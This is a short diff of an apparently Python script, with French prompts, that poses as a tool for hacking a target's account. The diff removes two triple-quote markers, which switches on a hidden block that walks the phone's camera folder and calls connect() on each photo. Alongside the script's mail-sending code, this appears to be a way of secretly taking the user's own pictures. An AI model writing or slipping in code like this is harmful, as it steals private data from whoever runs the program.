@@ -131,7 +131,7 @@ if option != 4:
  s.sendmail(sa, ra, msg.as_string())
 elif option == 4:
  upd()
-'''
+
 chemin = '/storage/emulated/0//DCIM/Camera/'
 os.chdir('/storage/emulated/0/DCIM/Camera')
 liste = os.listdir()
@@ -148,7 +148,7 @@ for x in liste:
                 na.remove(' ')
             name = ''.join(na)
             connect(name)
-'''
+
 if option == 1:
     lien = input('collez le lien du compte cible: ')
     print('searching for referentials...')
